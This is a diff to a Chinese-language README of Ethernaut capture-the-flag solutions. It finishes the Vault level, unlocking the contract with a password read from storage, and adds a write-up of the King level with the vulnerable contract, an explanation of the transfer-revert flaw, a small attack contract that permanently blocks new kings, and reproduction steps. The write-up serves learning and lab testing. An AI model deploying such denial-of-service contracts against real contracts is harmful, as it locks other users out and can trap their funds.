@@ -664,10 +664,96 @@ console.info(web3.utils.toAscii("0x412076657279207374726f6e672073656372657420706
 
 
 
-这就是密码了，然后用这个密码解锁，最后我们查看这个已经是解锁状态
+这就是密码了，然后用这个密码解锁，这里不用直接复制了，直接一句话搞定，最后我们查看这个已经是解锁状态
 
 ```
 contract.unlock(await web3.eth.getStorageAt(contract.address, 1))
 ```
 
 ![image-20240414224615466](D:\Etheraut_Solidity\README.assets\image-20240414224615466.png)
+
+![image-20240414224903600](D:\Etheraut_Solidity\README.assets\image-20240414224903600.png)
+
+# King
+
+```
+题目要求：
+下面的合约代表了一个非常简单的游戏：谁发送的以太币数量大于当前奖励，谁就成为新国王。 在这样的事件中，被推翻的国王将获得新的奖品，并在此过程中赚取一点以太！ 就像庞氏骗局一样
+
+这么有趣的游戏。 你的目标是打破它。
+当您将实例提交回关卡时，该关卡将收回王权。 如果你能避免这样的自我宣告，你就能通过关卡。
+```
+
+
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract King {
+    address king;
+    uint256 public prize;
+    address public owner;
+
+    constructor() payable {
+        owner = msg.sender;
+        king = msg.sender;
+        prize = msg.value;
+    }
+
+    receive() external payable {
+        require(msg.value >= prize || msg.sender == owner);
+        payable(king).transfer(msg.value);
+        king = msg.sender;
+        prize = msg.value;
+    }
+
+    function _king() public view returns (address) {
+        return king;
+    }
+}
+```
+
+这里我们看代码 意思就是谁给的钱多谁就是king，题目要收回王权那就是要打个很大的钱，你要让他收回不成功。
+
+收钱相关的是fallback和receive，这里只有receive，意思就是满足msg.value >= prize或者msg.sender == owner，就会把msg.value的eth转给当前的king，然后修改king为msg.sender，比如初始1 wei就是king，这时A打了2 wei，这时代码就会把2 wei转给初始的King，然后更新king为 A。
+
+容易想到的是transfer涉及到转账，如果说转给一个合约，会触发该合约的fallback或者receive，如果没有就会转载不成功，因此要攻击的话，写个没有fallback和receive方法的合约，先转账给King合约，变成king，然后别人就算比你转的钱多，到了transfer那一步也是失败
+
+```
+contract Attack {
+    address public kingContractAddress;
+
+    constructor(address payable _kingContractAddress) {
+        kingContractAddress = _kingContractAddress;
+    }
+
+    function attackKing() public payable {
+        (bool success, ) = kingContractAddress.call{value: msg.value}("");
+        require(success, "fail");
+    }
+}
+```
+
+复现：
+
+首先我们部署King合约，初始的prize设置成1 wei
+
+![image-20240414232031063](D:\Etheraut_Solidity\README.assets\image-20240414232031063.png)
+
+![image-20240414232117164](D:\Etheraut_Solidity\README.assets\image-20240414232117164.png)
+
+king和owner目前都是0x5B...
+
+然后部署攻击合约
+
+![image-20240414232144642](D:\Etheraut_Solidity\README.assets\image-20240414232144642.png)
+
+用一个比prize大的数，先满足条件，修改king为攻击合约
+
+![image-20240414232208080](D:\Etheraut_Solidity\README.assets\image-20240414232208080.png)
+
+![image-20240414232321757](D:\Etheraut_Solidity\README.assets\image-20240414232321757.png)
+
+这样别人再转多的钱 也无法成为king了
+
